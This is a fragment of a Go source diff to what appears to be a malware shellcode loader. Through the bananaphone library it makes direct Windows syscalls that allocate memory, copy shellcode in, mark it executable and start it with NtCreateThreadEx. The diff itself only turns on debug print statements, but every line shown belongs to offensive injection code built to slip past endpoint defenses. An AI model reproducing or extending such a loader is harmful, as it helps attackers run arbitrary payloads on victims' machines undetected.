@@ -9,6 +9,7 @@ import (
 	_ "embed"
 	b64 "encoding/base64"
 	"encoding/hex"
+	"fmt"
 	"golang.org/x/sys/windows"
 	"strconv"
 	"strings"
@@ -101,10 +102,10 @@ func createThread(shellcode []byte, handle uintptr, NtAllocateVirtualMemorySysid
 		uintptr(windows.MEM_COMMIT|windows.MEM_RESERVE),
 		windows.PAGE_READWRITE,
 	)
-	//fmt.Println("Allocated memory at", baseA)
+	fmt.Println("Allocated memory at", baseA)
 	//write memory
 	malwareUtil.Memcpy(baseA, shellcode)
-	//fmt.Println("Wrote shellcode to memory")
+	fmt.Println("Wrote shellcode to memory")
 	var oldprotect uintptr
 	bananaphone.Syscall(
 		NtProtectVirtualMemorySysid, //NtProtectVirtualMemory
@@ -114,7 +115,7 @@ func createThread(shellcode []byte, handle uintptr, NtAllocateVirtualMemorySysid
 		windows.PAGE_EXECUTE_READ,
 		uintptr(unsafe.Pointer(&oldprotect)),
 	)
-	//fmt.Println("Changed memory protection to PAGE_EXECUTE_READ")
+	fmt.Println("Changed memory protection to PAGE_EXECUTE_READ")
 	var hhosthread uintptr
 	bananaphone.Syscall(
 		NtCreateThreadExSysid,                //NtCreateThreadEx
@@ -130,6 +131,6 @@ func createThread(shellcode []byte, handle uintptr, NtAllocateVirtualMemorySysid
 		0,                                    //sizeofstackreserve
 		0,                                    //lpbytesbuffer
 	)
-	//fmt.Println("Created thread at", hhosthread)
+	fmt.Println("Created thread at", hhosthread)
 	bananaphone.Syscall(NtWaitForSingleObject, hhosthread, uintptr(0xffffffff), 0)
 }
